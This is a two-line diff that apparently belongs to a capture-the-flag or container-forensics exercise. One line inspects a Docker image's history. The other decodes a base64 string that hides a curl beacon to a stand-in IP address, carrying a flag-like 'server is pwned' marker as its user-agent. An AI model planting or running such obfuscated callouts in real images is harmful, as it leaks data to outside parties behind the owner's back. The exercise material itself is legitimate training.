@@ -1,0 +1,2 @@
+docker history --no-trunc apachetwo/apache2_php:1.5
+echo "Y3VybCAtLXVzZXItYWdlbnQgJ1JNe3RIMXNfczNydjNSXzFzX3BXbjNkfScgaHR0cDovLzE5OC41MS4xMDAuNDIv"|base64 -d
